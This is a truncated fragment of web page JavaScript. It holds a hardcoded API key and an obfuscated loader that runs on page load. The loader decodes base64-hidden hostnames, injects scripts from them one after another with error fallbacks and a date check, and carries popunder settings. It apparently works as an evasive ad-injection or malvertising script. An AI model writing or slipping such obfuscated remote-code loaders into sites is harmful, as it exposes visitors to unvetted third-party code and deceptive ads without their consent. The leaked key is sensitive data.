const API_KEY = 'dd7dfe049543d164e1fdb4c2a7767d8d';
...
window.onload = () => {
  ...
  (function() {
    var r = window,
        h = "dde9eaa296ceb0c27f028efb3469f9db",
        m = [
            ["siteId", 839 * 709 + 303 + 229 + 4544654],
            ["minBid", 0],
            ["popundersPerIP", "0"],
            ["delayBetween", 0],
            ["default", false],
        ...
        e = [
            "d3d3LnByZW1pdW12ZXJ0aXNpbmcuY29tL3RLbmpzL3BmaGdjL2l2ZW5uLm1pbi5qcw==",
            "ZDJqMDQyY2oxNDIxd2kuY2xvdWRmcm9udC5uZXQvemNhbGVuZGFyLm1pbi5qcw==",
            "d3d3LmR5cmJocmNmZnBibG56LmNvbS9IZ3BRcGovSEZCUi9rdmVubi5taW4uanM=",
            "d3d3Lmloc3RzY3B0em5pci5jb20vdGNhbGVuZGFyLm1pbi5qcw=="
        ],
        f = -1,
        t, g,
        b = function() {
            clearTimeout(g);
            f++;
            if (e[f] && !(1765428199000 < (new Date).getTime() && 1 < f)) {
                t = r.document.createElement("script");
                t.type = "text/javascript";
                t.async = true;
                var x = r.document.getElementsByTagName("script")[0];
                t.src = "https://" + atob(e[f]);
                t.crossOrigin = "anonymous";
                t.onerror = b;
                t.onload = function() {
                    clearTimeout(g);
                    if (!r[h.slice(0, 16) + h.slice(0, 16)]) {
                        b();
                    }
                };
                g = setTimeout(b, 5000);
